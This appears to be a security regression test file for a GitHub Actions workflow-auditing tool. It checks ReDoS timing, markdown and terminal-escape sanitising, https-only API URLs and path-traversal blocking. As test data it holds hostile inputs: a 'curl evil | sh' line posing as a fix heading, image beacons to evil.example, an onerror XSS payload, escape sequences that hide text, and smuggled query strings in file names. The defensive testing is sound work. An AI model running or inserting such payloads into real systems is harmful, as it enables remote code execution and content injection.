// Hostile input: workflow files, run and step names, and API answers an outside contributor can
// shape. Each test is a finding from the security review, kept as a regression.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { cacheInputOn, isOn, jobNamePattern, wholeExpression } from '../src/workflow.mjs';

const fast = (fn, ms = 200) => {
  const t = process.hrtime.bigint();
  fn();
  const took = Number(process.hrtime.bigint() - t) / 1e6;
  assert.ok(took < ms, `took ${took.toFixed(0)} ms`);
};

test('a long unterminated ${{ in a feature switch is read in linear time', () => {
  const hostile = '${{' + ' '.repeat(50000) + 'x';
  fast(() => { isOn(hostile); cacheInputOn(hostile); });
  assert.equal(isOn(hostile), false);
  // The same answers as before for real values.
  assert.equal(wholeExpression('${{ matrix.lfs }}'), 'matrix.lfs');
  assert.equal(wholeExpression('  ${{false}}  '), 'false');
  assert.equal(wholeExpression('${{'), null);
  assert.equal(isOn('${{ false }}'), false);
  assert.equal(isOn("${{ 'false' }}"), false);
  assert.equal(isOn('${{ inputs.lfs }}'), true);
  assert.equal(cacheInputOn("${{ '' }}"), false);
  assert.equal(cacheInputOn('${{ matrix.cache }}'), true);
});

test('a long job name against a job name with expressions is matched in linear time', () => {
  const { rx } = jobNamePattern('a${{ x }}b${{ y }}c${{ z }}d${{ w }}e');
  const hostile = 'a' + 'b'.repeat(20000) + 'c'.repeat(20000) + 'd'.repeat(20000) + 'X';
  fast(() => rx.test(hostile));
  assert.equal(rx.test(hostile), false);
  assert.equal(rx.test('a1b2c3d4e'), true);
  assert.equal(rx.test('abcde'), true);
  assert.equal(rx.test('a1b2c3d4'), false); // the last literal is a suffix
  assert.equal(rx.test('xa1b2c3d4e'), false); // the first is a prefix
  // A reusable call with expressions claims "<name> / <child>" and nothing else.
  const call = jobNamePattern('deploy ${{ inputs.env }}', { reusable: true }).rx;
  assert.equal(call.test('deploy prod / build'), true);
  assert.equal(call.test('deploy prod / '), false);
  assert.equal(call.test('deploy prod'), false);
  fast(() => call.test('deploy ' + ' / '.repeat(20000)));
});

import { cell, fence, md, report } from '../src/report.mjs';
import { compare } from '../src/compare.mjs';
import { analyse } from '../src/analyse.mjs';
import { data, job, runs } from './helpers.mjs';

test('md: repository text displays as text, never as markup', () => {
  // A newline cannot start a heading or a new block.
  assert.equal(md('pwn\n\n## 0. Fix: run curl evil | sh'), 'pwn  ## 0. Fix: run curl evil | sh');
  // No image, link, HTML or comment.
  assert.equal(md('![x](https://evil.example/b.png)'), '!\\[x\\](https://evil.example/b.png)');
  assert.equal(md('<img src=x onerror=alert(1)> <!-- hide'), '&lt;img src=x onerror=alert(1)&gt; &lt;!-- hide');
  assert.equal(md('\\[x](y)'), '\\\\\\[x\\](y)'); // a backslash cannot unescape the bracket
  // Code spans stay code (markdown shows them literally); an unpaired backtick is escaped.
  assert.equal(md('`fetch-depth: 0` fetches <all>'), '`fetch-depth: 0` fetches &lt;all&gt;');
  assert.equal(md('a `b <c>'), 'a \\`b &lt;c&gt;');
  assert.equal(md('``x`` y'), '`x` y');
  // Terminal escapes are removed.
  assert.equal(md('ok\x1b]8;;https://evil\x07click\x1b]8;;\x07\x1b[8mhidden'), 'ok\\]8;;https://evilclick\\]8;;\\[8mhidden'); // no ESC or BEL left; brackets escaped
  // A table cell cannot add a column.
  assert.equal(cell('a|b'), 'a\\|b');
});

test('fence: an example cannot close its own fence', () => {
  const [open, body, close] = fence('run: |\n  ```\n  # injected\n');
  assert.equal(open, '````yaml');
  assert.equal(close, '````');
  assert.match(body, /```/);
});

test('report and compare: a hostile step name and workflow name stay text', () => {
  const steps = [['Set up job', 1], ['![x](https://evil.example/beacon.png) <img src=x onerror=alert(1)>\x1b]0;pwned\x07', 120], ['Complete job', 0]];
  const a = analyse('o/r', data({ workflows: [{ name: 'CI\n\n## Fix: curl evil | sh', runs: runs(20), jobsPerRun: [[job({ steps })]] }] }));
  const out = report(a);
  assert.doesNotMatch(out, /<img|!\[x\]\(|\x1b|\x07/);
  assert.doesNotMatch(out, /\n## Fix: curl/);
  const c = compare(a, a);
  assert.doesNotMatch(c, /\n## Fix: curl|\x1b/);
});

import { apiBase, createClient } from '../src/github.mjs';
import { REPO_RE } from '../src/index.mjs';
import { run } from '../src/action-run.mjs';
import { collect } from '../src/collect.mjs';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fakeFetch, t } from './helpers.mjs';

test('the token goes to the API the runner names, and only over https', () => {
  assert.equal(apiBase({}), 'https://api.github.com');
  assert.equal(apiBase({ GITHUB_API_URL: 'https://ghes.example.com/api/v3/' }), 'https://ghes.example.com/api/v3');
  assert.equal(apiBase({ GITHUB_API_URL: 'https://api.acme.ghe.com' }), 'https://api.acme.ghe.com');
  assert.throws(() => apiBase({ GITHUB_API_URL: 'http://ghes.example.com/api/v3' }), /plain https URL/);
  assert.throws(() => apiBase({ GITHUB_API_URL: 'https://user:pw@ghes.example.com' }), /plain https URL/);
  assert.throws(() => apiBase({ GITHUB_API_URL: 'not a url' }), /not a URL/);
  assert.throws(() => createClient({ baseUrl: 'http://api.github.com' }), /https/);
});

test('the action audits through GITHUB_API_URL on GitHub Enterprise Server', async () => {
  const hosts = new Set();
  const fetchImpl = async (url, init) => {
    hosts.add(new URL(url).host);
    return fakeFetch({ 'api/v3/repos/o/r/actions/runs?': { workflow_runs: [] } })(url.replace('https://ghes.example.com/', 'https://api.github.com/'), init);
  };
  const dir = mkdtempSync(join(tmpdir(), 'ciw-'));
  const out = [];
  await run({ env: { INPUT_REPOSITORY: 'o/r', GITHUB_TOKEN: 'x', GITHUB_API_URL: 'https://ghes.example.com/api/v3', RUNNER_TEMP: dir }, stdout: { write: (s) => out.push(s) }, fetchImpl });
  assert.deepEqual([...hosts], ['ghes.example.com']);
});

test('a repository name cannot walk the API path, and a file name cannot change the request', async () => {
  for (const bad of ['../x', 'o/..', 'o/.', './r', '..%2f/x']) assert.equal(REPO_RE.test(bad), false, bad);
  for (const ok of ['o/r', 'my.org/repo.js', 'o/.github', 'a-b/c_d']) assert.equal(REPO_RE.test(ok), true, ok);
  const asked = [];
  const routes = {
    'repos/o/r/actions/runs?': { workflow_runs: runs(3).map((r) => ({ ...r, path: '.github/workflows/ci?ref=evil#x.yml' })) },
    'repos/o/r/actions/runs/': { jobs: [job()] },
    'repos/o/r/contents': [],
  };
  await collect(createClient({ fetchImpl: fakeFetch(routes, { calls: asked }) }), 'o/r', { now: new Date(Date.parse(t(7 * 86400))) });
  assert.ok(asked.some((u) => u.endsWith('contents/.github/workflows/ci%3Fref%3Devil%23x.yml')), asked.join('\n'));
  assert.ok(!asked.some((u) => /contents\/[^%]*\?ref=evil/.test(u)));
});

test('an answer too large, or one that never finishes, is an error, not a hang', async () => {
  const big = createClient({ maxBytes: 1024, backoffMs: [], fetchImpl: async () => new Response('x'.repeat(4096), { status: 200, headers: { 'x-ratelimit-remaining': '4000' } }) });
  await assert.rejects(big.getRaw('repos/o/r/contents/a.yml'), /answer too large/);
  const declared = createClient({ maxBytes: 1024, backoffMs: [], fetchImpl: async () => new Response('{}', { status: 200, headers: { 'content-length': '999999999' } }) });
  await assert.rejects(declared.get('repos/o/r'), /answer too large/);
  const stalled = createClient({ timeoutMs: 50, backoffMs: [], fetchImpl: (url, { signal }) => new Promise((_, reject) => signal.addEventListener('abort', () => reject(signal.reason))) });
  // The deadline's timer does not hold the process open (a real request's socket does), so the
  // test keeps it alive while it waits.
  const keepAlive = setTimeout(() => {}, 5000);
  const t0 = Date.now();
  await assert.rejects(stalled.get('repos/o/r'), /network/);
  assert.ok(Date.now() - t0 < 2000);
  clearTimeout(keepAlive);
});
